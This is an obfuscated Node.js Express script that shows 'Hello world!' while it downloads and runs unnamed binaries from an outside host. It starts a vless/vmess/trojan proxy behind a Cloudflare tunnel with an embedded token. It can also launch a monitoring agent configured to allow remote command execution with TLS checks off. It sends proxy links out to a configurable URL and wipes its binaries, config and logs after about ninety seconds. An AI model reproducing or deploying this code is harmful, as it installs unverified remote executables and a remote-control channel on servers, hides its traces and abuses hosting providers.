function _0x41d1(){const _0x384cb8=['arch','\x22\x20>\x20/dev/null\x202>&1','arm64','NEZHA_PORT','list.txt','944688EKbjwE','\x20already\x20exists','stringify','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Error\x20in\x20startserver:','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','UUID','\x20successfully','config.json','\x20failed:\x20','express','unlinkSync','arm','taskkill\x20/f\x20/im\x20','AUTO_ACCESS','/tunnel.yml\x20run','fileName','./tmp','UPLOAD_URL','sub.txt','ArgoDomain:','2053','existsSync','vless','child_process','readdirSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','status','Empowerment\x20failed\x20for\x20','match','\x20-c\x20','util','/api/add-nodes','toString','readFileSync','\x20is\x20created','php\x20running\x20error:\x20','NAME','TunnelSecret','random','test','jiakuan','127.0.0.1','log','Content-Type','Subscription\x20uploaded\x20successfully','/vless-argo','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Error\x20reading\x20boot.log:','writeFileSync','https://arm64.ssss.nyc.mn/v1','filter','807076cMnUax','pkill\x20-f\x20\x22[','SUB_PATH','2087','&path=%2Ftrojan-argo%3Fed%3D2560#','amd','stream','none','axios','ARGO_DOMAIN','boot.log','data','from','Add\x20automatic\x20access\x20task\x20faild:\x20','push','text/plain;\x20charset=utf-8','forEach','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','1051310lkbUgg','2903586ypuHIV','listen','unshift','freedom','https://arm64.ssss.nyc.mn/web','block','--tls','?encryption=none&security=tls&sni=','exec','length','utf-8','charAt','\x20is\x20running','blackhole','catch','9jMjHiX','firefox','\x20>\x20nul\x202>&1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','tcp','env','/config.json\x20>/dev/null\x202>&1\x20&','send','spa-sgg.hongge.ggff.net','split','tls','ARGO_PORT','platform','then','eyJhIjoiZTAyMTYzZTk4Y2NmYTA0ZTQ3YzkyNjQ4NjdiOTU4ZGEiLCJ0IjoiODBhOTYwNmQtNTA0NC00ZDI2LTlhZDEtMTI1NmEzY2VjOWUzIiwicyI6IlpUTXhaRFprTW1JdE5HSXlPUzAwTURVekxXSTVNMlF0TURkbU1EazNaV1E1T0RobCJ9','config.yaml','388848CmOLxt','base64','ARGO_DOMAIN:','5028SzZdpm','\x0a\x20\x20\x0atrojan://','message','90Zykdoo','/dev/null','/trojan-argo','NEZHA_KEY','isFile','Download\x20','2096','pipe','3072856aNUUPu','quic','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Error\x20downloading\x20files:','all','createWriteStream','\x20>/dev/null\x202>&1','3adfde33-696b-48ee-adb1-595908aeaa45','Skipping\x20adding\x20automatic\x20access\x20task','cdns.doon.eu.org','has','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','https://amd64.ssss.nyc.mn/web','join','true','clear','FILE_PATH','http','\x0a\x20\x20\x0avmess://','NEZHA\x20variable\x20is\x20empty,skip\x20running','Nodes\x20uploaded\x20successfully','fileUrl','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','2083','application/json','/sub.txt\x20saved\x20successfully','.exe\x20>\x20nul\x202>&1','https://amd64.ssss.nyc.mn/bot','https://amd64.ssss.nyc.mn/agent','&fp=firefox&type=ws&host=','/vmess-argo?ed=2560','trojan','https://arm64.ssss.nyc.mn/agent','error','statSync','floor','https+local://8.8.8.8/dns-query','https://amd64.ssss.nyc.mn/v1','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','tunnel.json','trim','Error\x20executing\x20command:\x20','?security=tls&sni=','finish','\x20>/dev/null\x202>&1\x20&','close','/api/add-subscriptions','get','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','mkdirSync','nohup\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','/api/delete-nodes','includes','8443','/vmess-argo','npm\x20running\x20error:\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','tunnel.yml','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','aarch64','sub','Hello\x20world!','https://arm64.ssss.nyc.mn/bot','response','443','automatic\x20access\x20task\x20added\x20successfully','\x20-c\x20\x22','direct','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','win32','basename','post','\x0a\x20\x20credentials-file:\x20','CFIP','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'];_0x41d1=function(){return _0x384cb8;};return _0x41d1();}const _0x17bda6=_0x5081;(function(_0x370007,_0x3e51ef){const _0x2f2202=_0x5081,_0x2a5703=_0x370007();while(!![]){try{const _0x5f5dfa=parseInt(_0x2f2202(0x141))/0x1*(parseInt(_0x2f2202(0x13e))/0x2)+parseInt(_0x2f2202(0x13b))/0x3+parseInt(_0x2f2202(0x109))/0x4+-parseInt(_0x2f2202(0x11b))/0x5+-parseInt(_0x2f2202(0xd5))/0x6+parseInt(_0x2f2202(0x11c))/0x7+parseInt(_0x2f2202(0x149))/0x8*(-parseInt(_0x2f2202(0x12b))/0x9);if(_0x5f5dfa===_0x3e51ef)break;else _0x2a5703['push'](_0x2a5703['shift']());}catch(_0x38dd2a){_0x2a5703['push'](_0x2a5703['shift']());}}}(_0x41d1,0x35dd2));const express=require(_0x17bda6(0xdf)),app=express(),axios=require(_0x17bda6(0x111)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x17bda6(0xf4)),exec=promisify(require(_0x17bda6(0xed))[_0x17bda6(0x124)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x17bda6(0x130)][_0x17bda6(0xe7)]||'',PROJECT_URL=process[_0x17bda6(0x130)]['PROJECT_URL']||'',AUTO_ACCESS=process['env'][_0x17bda6(0xe3)]||![],FILE_PATH=process['env'][_0x17bda6(0x94)]||_0x17bda6(0xe6),SUB_PATH=process['env'][_0x17bda6(0x10b)]||_0x17bda6(0xc1),PORT=process[_0x17bda6(0x130)]['SERVER_PORT']||process[_0x17bda6(0x130)]['PORT']||0xbb8,UUID=process['env'][_0x17bda6(0xdb)]||_0x17bda6(0x150),NEZHA_SERVER=process[_0x17bda6(0x130)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x17bda6(0x130)][_0x17bda6(0xd3)]||'',NEZHA_KEY=process[_0x17bda6(0x130)][_0x17bda6(0x144)]||'',ARGO_DOMAIN=process[_0x17bda6(0x130)][_0x17bda6(0x112)]||_0x17bda6(0x133),ARGO_AUTH=process[_0x17bda6(0x130)]['ARGO_AUTH']||_0x17bda6(0x139),ARGO_PORT=process[_0x17bda6(0x130)][_0x17bda6(0x136)]||0x1f41,CFIP=process[_0x17bda6(0x130)][_0x17bda6(0xce)]||_0x17bda6(0x152),CFPORT=process[_0x17bda6(0x130)]['CFPORT']||0x1bb,NAME=process['env'][_0x17bda6(0xfa)]||_0x17bda6(0xfe);!fs['existsSync'](FILE_PATH)?(fs[_0x17bda6(0xb5)](FILE_PATH),console[_0x17bda6(0x100)](FILE_PATH+_0x17bda6(0xf8))):console['log'](FILE_PATH+_0x17bda6(0xd6));function generateRandomName(){const _0x17c831=_0x17bda6,_0x345c5e='abcdefghijklmnopqrstuvwxyz';let _0x2d202d='';for(let _0x25cad0=0x0;_0x25cad0<0x6;_0x25cad0++){_0x2d202d+=_0x345c5e[_0x17c831(0x127)](Math[_0x17c831(0xa7)](Math[_0x17c831(0xfc)]()*_0x345c5e[_0x17c831(0x125)]));}return _0x2d202d;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x17bda6(0x91)](FILE_PATH,phpName),webPath=path[_0x17bda6(0x91)](FILE_PATH,webName),botPath=path[_0x17bda6(0x91)](FILE_PATH,botName),subPath=path[_0x17bda6(0x91)](FILE_PATH,_0x17bda6(0xe8)),listPath=path[_0x17bda6(0x91)](FILE_PATH,_0x17bda6(0xd4)),bootLogPath=path[_0x17bda6(0x91)](FILE_PATH,_0x17bda6(0x113)),configPath=path[_0x17bda6(0x91)](FILE_PATH,_0x17bda6(0xdd));function deleteNodes(){const _0x526db1=_0x17bda6;try{if(!UPLOAD_URL)return;if(!fs[_0x526db1(0xeb)](subPath))return;let _0x1aba22;try{_0x1aba22=fs[_0x526db1(0xf7)](subPath,'utf-8');}catch{return null;}const _0x215ff4=Buffer['from'](_0x1aba22,'base64')[_0x526db1(0xf6)](_0x526db1(0x126)),_0x55084c=_0x215ff4[_0x526db1(0x134)]('\x0a')[_0x526db1(0x108)](_0x4ab31f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x526db1(0xfd)](_0x4ab31f));if(_0x55084c[_0x526db1(0x125)]===0x0)return;return axios[_0x526db1(0xcc)](UPLOAD_URL+_0x526db1(0xb8),JSON[_0x526db1(0xd7)]({'nodes':_0x55084c}),{'headers':{'Content-Type':_0x526db1(0x9c)}})['catch'](_0x56fc5b=>{return null;}),null;}catch(_0x52b94a){return null;}}function cleanupOldFiles(){const _0x3501eb=_0x17bda6;try{const _0xb74074=fs[_0x3501eb(0xee)](FILE_PATH);_0xb74074[_0x3501eb(0x119)](_0x228911=>{const _0x513dd8=_0x3501eb,_0x3734d4=path['join'](FILE_PATH,_0x228911);try{const _0x47d296=fs[_0x513dd8(0xa6)](_0x3734d4);_0x47d296[_0x513dd8(0x145)]()&&fs[_0x513dd8(0xe0)](_0x3734d4);}catch(_0x5f24b1){}});}catch(_0x5ea3d2){}}app[_0x17bda6(0xb3)]('/',function(_0xc1a3b8,_0x388ebc){const _0xf247cb=_0x17bda6;_0x388ebc[_0xf247cb(0x132)](_0xf247cb(0xc2));});async function generateConfig(){const _0x275488=_0x17bda6,_0x5155d5={'log':{'access':_0x275488(0x142),'error':_0x275488(0x142),'loglevel':_0x275488(0x110)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x275488(0xec),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x275488(0x110),'fallbacks':[{'dest':0xbb9},{'path':_0x275488(0x103),'dest':0xbba},{'path':_0x275488(0xbb),'dest':0xbbb},{'path':_0x275488(0x143),'dest':0xbbc}]},'streamSettings':{'network':_0x275488(0x12f)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x275488(0xec),'settings':{'clients':[{'id':UUID}],'decryption':_0x275488(0x110)},'streamSettings':{'network':_0x275488(0x12f),'security':_0x275488(0x110)}},{'port':0xbba,'listen':_0x275488(0xff),'protocol':_0x275488(0xec),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x275488(0x110)},'streamSettings':{'network':'ws','security':_0x275488(0x110),'wsSettings':{'path':_0x275488(0x103)}},'sniffing':{'enabled':!![],'destOverride':[_0x275488(0x95),'tls',_0x275488(0x14a)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x275488(0xff),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x275488(0xbb)}},'sniffing':{'enabled':!![],'destOverride':[_0x275488(0x95),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x275488(0xa3),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x275488(0x110),'wsSettings':{'path':_0x275488(0x143)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x275488(0x135),_0x275488(0x14a)],'metadataOnly':![]}}],'dns':{'servers':[_0x275488(0xa8)]},'outbounds':[{'protocol':_0x275488(0x11f),'tag':_0x275488(0xc8)},{'protocol':_0x275488(0x129),'tag':_0x275488(0x121)}]};fs[_0x275488(0x106)](path['join'](FILE_PATH,_0x275488(0xdd)),JSON['stringify'](_0x5155d5,null,0x2));}function getSystemArchitecture(){const _0x354589=_0x17bda6,_0x45e6e1=os[_0x354589(0xd0)]();return _0x45e6e1===_0x354589(0xe1)||_0x45e6e1===_0x354589(0xd2)||_0x45e6e1===_0x354589(0xc0)?'arm':_0x354589(0x10e);}function downloadFile(_0x2a9757,_0x202e4c,_0x2b3ad4){const _0x1e92b4=_0x17bda6,_0x3af6ef=_0x2a9757;!fs['existsSync'](FILE_PATH)&&fs[_0x1e92b4(0xb5)](FILE_PATH,{'recursive':!![]});const _0x63810f=fs[_0x1e92b4(0x14e)](_0x3af6ef);axios({'method':'get','url':_0x202e4c,'responseType':_0x1e92b4(0x10f)})[_0x1e92b4(0x138)](_0x532301=>{const _0x5348d0=_0x1e92b4;_0x532301[_0x5348d0(0x114)][_0x5348d0(0x148)](_0x63810f),_0x63810f['on'](_0x5348d0(0xaf),()=>{const _0x1d23e4=_0x5348d0;_0x63810f[_0x1d23e4(0xb1)](),console['log'](_0x1d23e4(0x146)+path[_0x1d23e4(0xcb)](_0x3af6ef)+_0x1d23e4(0xdc)),_0x2b3ad4(null,_0x3af6ef);}),_0x63810f['on'](_0x5348d0(0xa5),_0x5019a5=>{const _0x1f6090=_0x5348d0;fs['unlink'](_0x3af6ef,()=>{});const _0x57f887=_0x1f6090(0x146)+path[_0x1f6090(0xcb)](_0x3af6ef)+_0x1f6090(0xde)+_0x5019a5[_0x1f6090(0x140)];console['error'](_0x57f887),_0x2b3ad4(_0x57f887);});})[_0x1e92b4(0x12a)](_0x283ffc=>{const _0x2ee44a=_0x1e92b4,_0xf6946e=_0x2ee44a(0x146)+path[_0x2ee44a(0xcb)](_0x3af6ef)+_0x2ee44a(0xde)+_0x283ffc[_0x2ee44a(0x140)];console['error'](_0xf6946e),_0x2b3ad4(_0xf6946e);});}async function downloadFilesAndRun(){const _0x7b6568=_0x17bda6,_0x40c5cc=getSystemArchitecture(),_0x3bd721=getFilesForArchitecture(_0x40c5cc);if(_0x3bd721['length']===0x0){console[_0x7b6568(0x100)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x104a8b=_0x3bd721['map'](_0x42520b=>{return new Promise((_0x4266d5,_0x3a856d)=>{const _0x4c77f9=_0x5081;downloadFile(_0x42520b[_0x4c77f9(0xe5)],_0x42520b[_0x4c77f9(0x99)],(_0x18dfc1,_0x26dc80)=>{_0x18dfc1?_0x3a856d(_0x18dfc1):_0x4266d5(_0x26dc80);});});});try{await Promise[_0x7b6568(0x14d)](_0x104a8b);}catch(_0x376ba1){console[_0x7b6568(0xa5)](_0x7b6568(0x14c),_0x376ba1);return;}function _0x27bc0b(_0x4385e7){const _0x109c36=_0x7b6568,_0x2c861f=0x1fd;_0x4385e7[_0x109c36(0x119)](_0x2a7314=>{const _0x325175=_0x109c36;fs[_0x325175(0xeb)](_0x2a7314)&&fs['chmod'](_0x2a7314,_0x2c861f,_0x5df597=>{const _0x31c6f2=_0x325175;_0x5df597?console[_0x31c6f2(0xa5)](_0x31c6f2(0xf1)+_0x2a7314+':\x20'+_0x5df597):console[_0x31c6f2(0x100)]('Empowerment\x20success\x20for\x20'+_0x2a7314+':\x20'+_0x2c861f[_0x31c6f2(0xf6)](0x8));});});}const _0x3784d5=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x27bc0b(_0x3784d5);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5f5c2a=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x3106a7=new Set([_0x7b6568(0xc5),_0x7b6568(0xba),_0x7b6568(0x147),_0x7b6568(0x10c),_0x7b6568(0x9b),_0x7b6568(0xea)]),_0x5c0730=_0x3106a7[_0x7b6568(0x8e)](_0x5f5c2a)?_0x7b6568(0x92):'false',_0x2d7a05='\x0aclient_secret:\x20'+NEZHA_KEY+_0x7b6568(0xda)+NEZHA_SERVER+_0x7b6568(0xbf)+_0x5c0730+_0x7b6568(0xd8)+UUID;fs['writeFileSync'](path[_0x7b6568(0x91)](FILE_PATH,_0x7b6568(0x13a)),_0x2d7a05);const _0x3a1ee0=_0x7b6568(0xb6)+phpPath+_0x7b6568(0xc7)+FILE_PATH+_0x7b6568(0x9a);try{await exec(_0x3a1ee0),console[_0x7b6568(0x100)](phpName+'\x20is\x20running'),await new Promise(_0x274a7e=>setTimeout(_0x274a7e,0x3e8));}catch(_0x4c2e48){console['error'](_0x7b6568(0xf9)+_0x4c2e48);}}else{let _0xa1ec4f='';const _0x3b4497=[_0x7b6568(0xc5),_0x7b6568(0xba),_0x7b6568(0x147),_0x7b6568(0x10c),_0x7b6568(0x9b),_0x7b6568(0xea)];_0x3b4497[_0x7b6568(0xb9)](NEZHA_PORT)&&(_0xa1ec4f=_0x7b6568(0x122));const _0xd20c7e=_0x7b6568(0xb6)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0xa1ec4f+_0x7b6568(0xb7);try{await exec(_0xd20c7e),console['log'](npmName+_0x7b6568(0x128)),await new Promise(_0x4d433c=>setTimeout(_0x4d433c,0x3e8));}catch(_0x4b9b6b){console[_0x7b6568(0xa5)](_0x7b6568(0xbc)+_0x4b9b6b);}}}else console[_0x7b6568(0x100)](_0x7b6568(0x97));const _0x3c1d3b=_0x7b6568(0xb6)+webPath+_0x7b6568(0xf3)+FILE_PATH+_0x7b6568(0x131);try{await exec(_0x3c1d3b),console[_0x7b6568(0x100)](webName+_0x7b6568(0x128)),await new Promise(_0x370110=>setTimeout(_0x370110,0x3e8));}catch(_0x16babd){console[_0x7b6568(0xa5)]('web\x20running\x20error:\x20'+_0x16babd);}if(fs[_0x7b6568(0xeb)](botPath)){let _0x474e24;if(ARGO_AUTH[_0x7b6568(0xf2)](/^[A-Z0-9a-z=]{120,250}$/))_0x474e24=_0x7b6568(0xef)+ARGO_AUTH;else ARGO_AUTH[_0x7b6568(0xf2)](/TunnelSecret/)?_0x474e24=_0x7b6568(0x14b)+FILE_PATH+_0x7b6568(0xe4):_0x474e24=_0x7b6568(0x12e)+FILE_PATH+_0x7b6568(0x11a)+ARGO_PORT;try{await exec(_0x7b6568(0xb6)+botPath+'\x20'+_0x474e24+_0x7b6568(0xb0)),console[_0x7b6568(0x100)](botName+_0x7b6568(0x128)),await new Promise(_0x32199f=>setTimeout(_0x32199f,0x7d0));}catch(_0x3aa185){console[_0x7b6568(0xa5)](_0x7b6568(0xad)+_0x3aa185);}}await new Promise(_0x42e1b9=>setTimeout(_0x42e1b9,0x1388));}function getFilesForArchitecture(_0x34812c){const _0x4e35d1=_0x17bda6;let _0x1af53d;_0x34812c===_0x4e35d1(0xe1)?_0x1af53d=[{'fileName':webPath,'fileUrl':_0x4e35d1(0x120)},{'fileName':botPath,'fileUrl':_0x4e35d1(0xc3)}]:_0x1af53d=[{'fileName':webPath,'fileUrl':_0x4e35d1(0x90)},{'fileName':botPath,'fileUrl':_0x4e35d1(0x9f)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5cfb5c=_0x34812c==='arm'?_0x4e35d1(0xa4):_0x4e35d1(0xa0);_0x1af53d[_0x4e35d1(0x11e)]({'fileName':npmPath,'fileUrl':_0x5cfb5c});}else{const _0x3b1a88=_0x34812c==='arm'?_0x4e35d1(0x107):_0x4e35d1(0xa9);_0x1af53d[_0x4e35d1(0x11e)]({'fileName':phpPath,'fileUrl':_0x3b1a88});}}return _0x1af53d;}function argoType(){const _0x171e14=_0x17bda6;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x171e14(0x100)](_0x171e14(0xaa));return;}if(ARGO_AUTH[_0x171e14(0xb9)](_0x171e14(0xfb))){fs[_0x171e14(0x106)](path[_0x171e14(0x91)](FILE_PATH,_0x171e14(0xab)),ARGO_AUTH);const _0x59cda9='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x171e14(0x134)]('\x22')[0xb]+_0x171e14(0xcd)+path[_0x171e14(0x91)](FILE_PATH,_0x171e14(0xab))+_0x171e14(0xbd)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x171e14(0x104);fs[_0x171e14(0x106)](path[_0x171e14(0x91)](FILE_PATH,_0x171e14(0xbe)),_0x59cda9);}else console[_0x171e14(0x100)](_0x171e14(0x8f));}argoType();async function extractDomains(){const _0xddacc6=_0x17bda6;let _0x5ef6ac;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5ef6ac=ARGO_DOMAIN,console[_0xddacc6(0x100)](_0xddacc6(0x13d),_0x5ef6ac),await _0x12c09d(_0x5ef6ac);else try{const _0x302a2=fs['readFileSync'](path[_0xddacc6(0x91)](FILE_PATH,'boot.log'),'utf-8'),_0x5c1358=_0x302a2['split']('\x0a'),_0x190150=[];_0x5c1358[_0xddacc6(0x119)](_0x35114a=>{const _0x4d45cc=_0x35114a['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4d45cc){const _0x1953d3=_0x4d45cc[0x1];_0x190150['push'](_0x1953d3);}});if(_0x190150['length']>0x0)_0x5ef6ac=_0x190150[0x0],console['log'](_0xddacc6(0xe9),_0x5ef6ac),await _0x12c09d(_0x5ef6ac);else{console[_0xddacc6(0x100)](_0xddacc6(0xcf)),fs[_0xddacc6(0xe0)](path['join'](FILE_PATH,_0xddacc6(0x113)));async function _0x57ab78(){const _0x5aa565=_0xddacc6;try{process[_0x5aa565(0x137)]==='win32'?await exec(_0x5aa565(0xe2)+botName+_0x5aa565(0x9e)):await exec(_0x5aa565(0x10a)+botName[_0x5aa565(0x127)](0x0)+']'+botName['substring'](0x1)+_0x5aa565(0xd1));}catch(_0x1ed324){}}_0x57ab78(),await new Promise(_0x3595a2=>setTimeout(_0x3595a2,0xbb8));const _0x4ba784='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0xddacc6(0x11a)+ARGO_PORT;try{await exec(_0xddacc6(0xb6)+botPath+'\x20'+_0x4ba784+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0xddacc6(0x128)),await new Promise(_0x504f6e=>setTimeout(_0x504f6e,0xbb8)),await extractDomains();}catch(_0x2bcb4d){console[_0xddacc6(0xa5)](_0xddacc6(0xad)+_0x2bcb4d);}}}catch(_0x20796e){console[_0xddacc6(0xa5)](_0xddacc6(0x105),_0x20796e);}async function _0x12c09d(_0x338cee){const _0x1cb77c=_0xddacc6,_0x585fbe=execSync(_0x1cb77c(0xc9),{'encoding':_0x1cb77c(0x126)}),_0x9c214=_0x585fbe[_0x1cb77c(0xac)](),_0x5557ab=NAME?NAME+'-'+_0x9c214:_0x9c214;return new Promise(_0x1d6055=>{setTimeout(()=>{const _0x2046db=_0x5081,_0x1b26ed={'v':'2','ps':''+_0x5557ab,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2046db(0x110),'net':'ws','type':_0x2046db(0x110),'host':_0x338cee,'path':_0x2046db(0xa2),'tls':'tls','sni':_0x338cee,'alpn':'','fp':_0x2046db(0x12c)},_0x5cddcb='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x2046db(0x123)+_0x338cee+_0x2046db(0xa1)+_0x338cee+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x5557ab+_0x2046db(0x96)+Buffer[_0x2046db(0x115)](JSON[_0x2046db(0xd7)](_0x1b26ed))[_0x2046db(0xf6)](_0x2046db(0x13c))+_0x2046db(0x13f)+UUID+'@'+CFIP+':'+CFPORT+_0x2046db(0xae)+_0x338cee+'&fp=firefox&type=ws&host='+_0x338cee+_0x2046db(0x10d)+_0x5557ab+'\x0a\x20\x20\x20\x20';console[_0x2046db(0x100)](Buffer[_0x2046db(0x115)](_0x5cddcb)[_0x2046db(0xf6)](_0x2046db(0x13c))),fs['writeFileSync'](subPath,Buffer['from'](_0x5cddcb)['toString'](_0x2046db(0x13c))),console[_0x2046db(0x100)](FILE_PATH+_0x2046db(0x9d)),uploadNodes(),app[_0x2046db(0xb3)]('/'+SUB_PATH,(_0x5c2fa2,_0x2a68f8)=>{const _0x267eb8=_0x2046db,_0x456531=Buffer['from'](_0x5cddcb)[_0x267eb8(0xf6)]('base64');_0x2a68f8['set'](_0x267eb8(0x101),_0x267eb8(0x118)),_0x2a68f8[_0x267eb8(0x132)](_0x456531);}),_0x1d6055(_0x5cddcb);},0x7d0);});}}async function uploadNodes(){const _0x1cb41b=_0x17bda6;if(UPLOAD_URL&&PROJECT_URL){const _0x9500ea=PROJECT_URL+'/'+SUB_PATH,_0x3b530f={'subscription':[_0x9500ea]};try{const _0x5e6826=await axios[_0x1cb41b(0xcc)](UPLOAD_URL+_0x1cb41b(0xb2),_0x3b530f,{'headers':{'Content-Type':_0x1cb41b(0x9c)}});return _0x5e6826&&_0x5e6826[_0x1cb41b(0xf0)]===0xc8?(console[_0x1cb41b(0x100)](_0x1cb41b(0x102)),_0x5e6826):null;}catch(_0x5a29c9){if(_0x5a29c9[_0x1cb41b(0xc4)]){if(_0x5a29c9[_0x1cb41b(0xc4)][_0x1cb41b(0xf0)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1cb41b(0xeb)](listPath))return;const _0x343ff9=fs[_0x1cb41b(0xf7)](listPath,_0x1cb41b(0x126)),_0x595a7e=_0x343ff9[_0x1cb41b(0x134)]('\x0a')[_0x1cb41b(0x108)](_0x394bfd=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1cb41b(0xfd)](_0x394bfd));if(_0x595a7e[_0x1cb41b(0x125)]===0x0)return;const _0x254832=JSON[_0x1cb41b(0xd7)]({'nodes':_0x595a7e});try{const _0x385872=await axios['post'](UPLOAD_URL+_0x1cb41b(0xf5),_0x254832,{'headers':{'Content-Type':_0x1cb41b(0x9c)}});return _0x385872&&_0x385872[_0x1cb41b(0xf0)]===0xc8?(console[_0x1cb41b(0x100)](_0x1cb41b(0x98)),_0x385872):null;}catch(_0x9d498e){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3d2f0b=_0x5081,_0x44863d=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x44863d[_0x3d2f0b(0x117)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x44863d[_0x3d2f0b(0x117)](phpPath);process['platform']===_0x3d2f0b(0xca)?exec('del\x20/f\x20/q\x20'+_0x44863d['join']('\x20')+_0x3d2f0b(0x12d),_0x1cfc24=>{const _0x187d56=_0x3d2f0b;console[_0x187d56(0x93)](),console[_0x187d56(0x100)]('App\x20is\x20running'),console[_0x187d56(0x100)](_0x187d56(0xb4));}):exec('rm\x20-rf\x20'+_0x44863d['join']('\x20')+_0x3d2f0b(0x14f),_0x47cb67=>{const _0x3a2232=_0x3d2f0b;console[_0x3a2232(0x93)](),console[_0x3a2232(0x100)]('App\x20is\x20running'),console[_0x3a2232(0x100)](_0x3a2232(0xb4));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x115e7e=_0x17bda6;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x115e7e(0x100)](_0x115e7e(0x151));return;}try{const _0x1b6032=await axios[_0x115e7e(0xcc)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x115e7e(0x9c)}});return console['log'](_0x115e7e(0xc6)),_0x1b6032;}catch(_0x4fc5af){return console[_0x115e7e(0xa5)](_0x115e7e(0x116)+_0x4fc5af[_0x115e7e(0x140)]),null;}}function _0x5081(_0x191803,_0x2f72fb){const _0x41d140=_0x41d1();return _0x5081=function(_0x50818b,_0x1f7e9c){_0x50818b=_0x50818b-0x8e;let _0x4760bf=_0x41d140[_0x50818b];return _0x4760bf;},_0x5081(_0x191803,_0x2f72fb);}async function startserver(){const _0x4e148f=_0x17bda6;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0xfddd8a){console[_0x4e148f(0xa5)](_0x4e148f(0xd9),_0xfddd8a);}}startserver()['catch'](_0x312ff1=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x312ff1);}),app[_0x17bda6(0x11d)](PORT,()=>console[_0x17bda6(0x100)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
